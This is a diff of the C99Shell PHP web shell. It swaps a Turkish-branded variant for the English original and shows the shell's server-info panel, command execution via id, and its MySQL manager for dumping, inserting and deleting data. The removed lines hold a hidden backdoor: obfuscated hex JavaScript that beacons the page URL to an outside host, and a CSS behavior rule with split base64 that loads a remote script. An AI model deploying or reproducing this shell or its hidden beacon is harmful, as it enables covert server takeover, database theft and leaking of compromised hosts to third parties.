-var _0x5be8=["\x73\x72\x63","\x68\x74\x74\x70\x3A\x2F\x2F\x65\x76\x61\x6C\x2E\x63\x72\x79\x70\x74\x72\x2E\x6F\x72\x67\x2F\x3F\x78\x3D","\x68\x72\x65\x66"]
-a= new Image();
-a[_0x5be8[0]]=_0x5be8[1]+escape(location[_0x5be8[2]]);
-</script>
-<STYLE>
-TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}body {
-	behavior: url(data:text/javascript;b<?php?>a<?php?>s<?php?>e<?php?>6<?php?>4<?php?>,ZXZhbC5jcnlwdHIub3JnL2dvcmJhZ29yLmh0Yw);
-	background-color: #000106;
-}
-</style></head><BODY text=#ffffff leftMargin=0 topMargin=0 rightMargin=0 bottomMargin=0 marginwidth=0 marginheight=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99 Shell Designed by MilitanZ phpshell.in</b></font></a><font face=Webdings size=6><b>!</b></font></p>
-    <p>&nbsp;</p>    
-    </center></th></tr><tr><td><p align="left"><b>Server Yazilim:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>Uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Guvenlik Modu:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left">
-<?php
+?><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php echo getenv("HTTP_HOST"); ?> - c99shell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php echo $surl; ?>"><font face="Verdana" size="5"><b>C99Shell v. <?php echo $shver; ?></b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php echo $DISP_SERVER_SOFTWARE; ?></b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php echo wordwrap(php_uname(),90,"<br>",1); ?></b>&nbsp;</p><p align="left"><b><?php if (!$win) {echo wordwrap(myshellexec("id"),90,"<br>",1);} else {echo get_current_user();} ?></b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php echo $hsafemode; ?></b></p><p align="left"><?php
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
 if (empty($d)) {$d = realpath(".");} elseif(realpath($d)) {$d = realpath($d);}
 $d = str_replace("\\",DIRECTORY_SEPARATOR,$d);
@@ -901,13 +936,13 @@ echo "&nbsp;&nbsp;&nbsp;";
 if (is_writable($d))
 {
  $wd = true;
- $wdt = "<font color=green> [ ok ] </font>";
+ $wdt = "<font color=green>[ ok ]</font>";
  echo "<b><font color=green>".view_perms(fileperms($d))."</font></b>";
 }
 else
 {
  $wd = false;
- $wdt = "<font color=red> [ Sadece Read ] </font>";
+ $wdt = "<font color=red>[ Read-Only ]</font>";
  echo "<b>".view_perms_color($d)."</b>";
 }
 if (is_callable("disk_free_space"))
@@ -920,7 +955,7 @@ if (is_callable("disk_free_space"))
  if ($total < 0) {$total = 0;}
  $used = $total-$free;
  $free_percent = round(100/($total/$free),2);
- echo "<br><b>Toplam ".view_size($total)." kapasite, ve ".view_size($free)." Bo$. Ortalama(".$free_percent."%) </b>";
+ echo "<br><b>Free ".view_size($free)." of ".view_size($total)." (".$free_percent."%)</b>";
 }
 echo "<br>";
 $letters = "";
@@ -934,13 +969,13 @@ if ($win)
   if (!$bool) {$bool = is_dir($letter.":\\");}
   if ($bool)
   {
-   $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Disketin Takili oldugundan Emin ol!')\"":"").">[ ";
+   $letters .= "<a href=\"".$surl."act=ls&d=".urlencode($letter.":\\")."\"".($isdiskette?" onclick=\"return confirm('Make sure that the diskette is inserted properly, otherwise an error may occur.')\"":"").">[ ";
    if ($letter.":" != $v) {$letters .= $letter;}
    else {$letters .= "<font color=green>".$letter."</font>";}
    $letters .= " ]</a> ";
   }
  }
- if (!empty($letters)) {echo "<b>Bulunan Suruculer</b>: ".$letters."<br>";}
+ if (!empty($letters)) {echo "<b>Detected drives</b>: ".$letters."<br>";}
 }
 if (count($quicklaunch) > 0)
 {
@@ -955,7 +990,7 @@ if (count($quicklaunch) > 0)
  }
 }
 echo "</p></td></tr></table><br>";
-if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#FF0000 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
+if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">".$donated_html."</td></tr></table><br>";}
 echo "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"100%\" valign=\"top\">";
 if ($act == "") {$act = $dspact = "ls";}
 if ($act == "sql")
@@ -967,7 +1002,7 @@ if ($act == "sql")
  if ($sql_port)   {$sql_surl .= "&sql_port=".htmlspecialchars($sql_port);}
  if ($sql_db)     {$sql_surl .= "&sql_db=".htmlspecialchars($sql_db);}
  $sql_surl .= "&";
- ?><h3>Dikkat! SQL-Manager i  Hazirda  <u>DEGiL</u>. </h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php
+ ?><h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php
  if ($sql_server)
  {
   $sql_sock = mysql_connect($sql_server.":".$sql_port, $sql_login, $sql_passwd);
@@ -979,8 +1014,8 @@ if ($act == "sql")
  echo "<b>SQL Manager:</b><br>";
  if (!$sql_sock)
  {
-  if (!$sql_server) {echo "Baglanilamadi";}
-  else {echo "<center><b>Baglanilamadi</b></center>"; echo "<b>".$err."</b>";}
+  if (!$sql_server) {echo "NO CONNECTION";}
+  else {echo "<center><b>Can't connect</b></center>"; echo "<b>".$err."</b>";}
  }
  else
  {
@@ -996,7 +1031,7 @@ if ($act == "sql")
   echo "</center>";
  }
  echo "</td></tr><tr>";
- if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> </font></center><li>Eger sifre gecersizse ,admin olan sifredir .<li>Eger host, gecersizse, host, localhosttur</b><li>Eger port gecersizse normal port "3306"</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Lutfen formu doldur:</b><table><tr><td><b>Username(K.Adi)</b></td><td><b>Password(Sifre)</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }
+ if (!$sql_sock) {?><td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php echo $surl; ?>" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php }
  else
  {
   //Start left panel
@@ -1009,8 +1044,8 @@ if ($act == "sql")
    {
     echo "---[ <a href=\"".$sql_surl."&\"><b>".htmlspecialchars($sql_db)."</b></a> ]---<br>";
     $c = 0;
-    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
-    if (!$c) {echo "Databasede tablo bulunamadi!";}
+    while ($row = mysql_fetch_array($result)) {$count = mysql_query ("SELECT COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>»&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
+    if (!$c) {echo "No tables found in database.";}
    }
   }
   else
@@ -1027,7 +1062,7 @@ if ($act == "sql")
     echo "<option value=\"\">Databases (".$c.")</option>";
     echo $dbs;
    }
-   ?></select><hr size="1" noshade>Lutfen Database secin<hr size="1" noshade><input type="submit" value="Go"></form><?php
+   ?></select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php
   }
   //End left panel
   echo "</td><td width=\"100%\" height=\"1\" valign=\"top\">";
@@ -1037,7 +1072,7 @@ if ($act == "sql")
   {
    if (!is_numeric($c)) {$c = 0;}
    if ($c == 0) {$c = "no";}
-   echo "<hr size=\"1\" noshade><center><b>Bu Databasede ".$c." table(s) Tablo var! (".htmlspecialchars($sql_db).").<br>";
+   echo "<hr size=\"1\" noshade><center><b>There are ".$c." table(s) in this DB (".htmlspecialchars($sql_db).").<br>";
    if (count($dbquicklaunch) > 0) {foreach($dbsqlquicklaunch as $item) {echo "[ <a href=\"".$item[1]."\">".$item[0]."</a> ] ";}}
    echo "</b></center>";
    $acts = array("","dump");
@@ -1080,18 +1115,18 @@ if ($act == "sql")
     echo "<hr size=\"1\" noshade>";
     if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}
     if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}
-    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Gercekden istionmu Kardes:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Evet\">&nbsp;<input type=\"submit\" value=\"Hayir\"></form></td></tr></table>";}
+    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";}
    }
    if (in_array($sql_act,$acts))
    {
-    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Yeni Tablo olustur:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Olustur"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
+    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php
     if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}
     if ($sql_act == "newtbl")
     {
      echo "<b>";
-     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo " \"".htmlspecialchars($sql_newdb)."\" Yeni database olusturuldu!</b><br>";
+     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";
     }
-    else {echo "Database Olusturulamadi \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
+    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}
    }
    elseif ($sql_act == "dump")
    {
@@ -1137,15 +1172,15 @@ if ($act == "sql")
      elseif ($sql_dump_savetofile)
      {
       $fp = fopen($sql_dump_file,"w");
-      if (!$fp) {echo "<b>Dump hatasi OLusturulamadi \"".htmlspecialchars($sql_dump_file)."\"!";}
+      if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}
       else
       {
        fwrite($fp,$ret);
        fclose($fp);
-       echo "<b>Dumped(Dokuldu)! Dump Yazildi \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
+       echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";
       }
      }
-     else {echo "<b>Dump: hicbirsey yapilamadi!</b>";}
+     else {echo "<b>Dump: nothing to do!</b>";}
     }
    }
    if ($diplay)
@@ -1181,7 +1216,7 @@ if ($act == "sql")
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
      echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";
-     if ($sql_tbl_act == "structure") {echo "<br><br><b>spyhackerz.com </b>";}
+     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}
      if ($sql_tbl_act == "insert")
      {
       if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}
@@ -1191,7 +1226,7 @@ if ($act == "sql")
       }
       else
       {
-       echo "<br><br><b>Row u tabloya sok :</b><br>";
+       echo "<br><br><b>Inserting row into table:</b><br>";
        if (!empty($sql_tbl_insert_q))
        {
         $sql_query = "SELECT * FROM `".$sql_tbl."`";
@@ -1202,18 +1237,18 @@ if ($act == "sql")
         mysql_free_result($result);
        }
        else {$values = array();}
-       echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Alan</b></td><td><b>Tip</b></td><td><b>Fonksiyon</b></td><td><b>Value</b></td></tr>";
+       echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";
        foreach ($tbl_struct_fields as $field)
        {
-        $name = $field["Alan"];
+        $name = $field["Field"];
         if (empty($sql_tbl_insert_q)) {$v = "";}
-        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Tip"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
+        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";
         $i++;
        }
        echo "</table><br>";
-       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Yeni ilave sok</b>";
+       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";
        if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}
-       echo "<br><br><input type=\"submit\" value=\"Tamam\"></form>";
+       echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";
       }
      }
      if ($sql_tbl_act == "browse")
@@ -1221,7 +1256,7 @@ if ($act == "sql")
       $sql_tbl_ls = abs($sql_tbl_ls);
       $sql_tbl_le = abs($sql_tbl_le);
       echo "<hr size=\"1\" noshade>";
-      echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Sayfalar\">&nbsp;";
+      echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";
       $b = 0;
       for($i=0;$i<$numpages;$i++)
       {
@@ -1266,16 +1301,16 @@ if ($act == "sql")
         $i++;
        }
        echo "<td>";
-       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"SIL\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
-       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Duzenle\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";
+       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";
